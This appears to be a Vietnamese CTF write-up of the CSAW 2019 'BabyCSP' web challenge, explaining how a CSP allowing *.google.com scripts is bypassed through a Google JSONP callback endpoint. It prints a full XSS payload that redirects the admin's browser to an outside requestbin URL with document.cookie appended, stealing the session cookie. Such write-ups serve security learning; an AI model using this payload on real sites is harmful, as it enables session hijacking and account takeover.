# CSAW CTF Qualification Round 2019

----
## BabyCSP ([Link](http://web.chal.csaw.io:1000/))
    Mà có vẻ tính đến thời điểm này thì link đóng mất tiêu rồi ...
    
- Nói chung thì cũng là lần đầu giải CTF online, văn kém nên viết writeup cũng hơi lủng củng... 1 phần thì cũng là do may mắn khi google nên rất nhanh mình đã tìm được hướng đi cho bài này, phần còn lại thì cũng giải khá nhiều bài XSS nên phần sau của bài CSP này của mình cũng khá nhanh. Cảm giác rất dễ chịu cho bài CTF online đầu tiên. Qua đến bài Unagi thì... mù tịt hướng đi... Dù đã làm nhiều về upload file liên quan tới image rồi nhưng với xml thì chưa bao giờ làm. Sau 1 đoạn thời gian google không có kết quả khả quan thì mình quyết định đi học bài để mai thi... Kết thúc kỷ niệm về bài giải CTF online...

- Mở đầu đề bài 1 đoạn CSP sau:

> Sơ bộ 1 chút thì Content Security Policy (CSP) là chính sách bảo mật nội dung, được sử dụng để xác định các nguồn nội dung an toàn trên website mà trình duyệt có thể tải về cho người dùng. CSP là biện pháp đối phó rất hiệu quả với kiểu hack chèn mã độc Cross Site Scripting (XSS).

[csp](image/csp.png)

- Chú ý đến đoạn: `script-src 'self' *.google.com`
    - Hiểu đơn giản 1 chút thì đoạn csp trên chỉ định rõ nguồn sử dụng Javascript hợp lệ là `*google.com`
        - Để hiểu rõ hơn thì: [link](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
- Vấn đề là bây giờ kiếm đâu ra nguồn Javascript của google và gắn đoạn payload của mình vô để bypass qua csp của bài... Thôi google để xem có tìm thấy gì đó hữu ích không...
- Mình là con người đơn giản, đề cho cái gì thì ghi sạch lên google để tìm thử: `bypass csp xss script src google.com`
- Mò 1 hồi thì cũng tìm thấy thông tin hữu ích... [Link](https://appio.dev/vulns/google-csp-evaluator/)
    - Để ý đoạn này: `The first one is that *.google-analytics.com hosts JSONP endpoints, that would allow us to bypass the CSP.`
    - Cũng như `*.google.com`, ta có thể bypass qua csp bằng JSONP endpoints

- Rất may là trong link đó họ cho cả 1 whitelist JSONP luôn, đỡ mất công tìm
    - Phân vân 1 hồi thì mình chọn link sau để thêm payload vào: `https://accounts.google.com/o/oauth2/revoke?callback=`
    - Test luôn, không nói nhiều, nhồi 1 đoạn Javascript đơn giản `alert(1)` vô link rồi submit xem có gì xảy ra không

    `<script type="text/javascript" src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`
    - Vì viết writeup hơi muộn nên web đóng mất tiêu rồi. Ảnh nào có thì up luôn, ảnh nào không có thì đi mượn ké vậy...

    [alert](alert.png)
   - Thành công mỹ mãn, giờ thì dễ rồi. Tạo 1 requestsbin ngay và luôn để hứng flag thôi chứ làm gì
   - đoạn payload để get cookie admin của mình: `location.replace('https://enzbo4rvhzz9n.x.pipedream.net/?key='%2bdocument.cookie)`

        - Giải thích 1 chút thì hàm `location.replace` sẽ ngay lập tức dẫn client đến URL format `location.replace(URL)`, ở đây kèm theo hàm `document.cookie` nữa để GET ra cookie của admin`

- Payload cuối cùng để mình submit lên đó là:
`<script type="text/javascript" src="https://accounts.google.com/o/oauth2/revoke?callback=location.replace('https://enzbo4rvhzz9n.x.pipedream.net/?key='%2bdocument.cookie)"></script>`

- Tuy nhiên là có vấn đề nho nhỏ ở đây, mới đầu ta submit payload lên thì nó đi thẳng tới requestsbin luôn, tức là nó gửi cookie của ta lên requestsbin luôn, lấy làm gì nhỉ, bộ flag trong source luôn chắc...

- Bây giờ ra submit đại 1 cái gì đó lên, rồi nhấn vô `report to admin`, và bây giờ ta được chuyển qua link `http://web.chal.csaw.io:1000/report?id=52279` trong 1 khoảng khắc. Giờ rõ rồi, mỗi submit sẽ tạo 1 post chứa id riêng và khi report lên admin thì chỉ cần thay id là được.
- Giờ đơn giản rồi, submit lại payload và lấy ra id của nó. Thay vô link report rồi report lên admin lại là xong. Bây giờ lên requestsbin lấy flag thôi

[flag](image/flag.png)
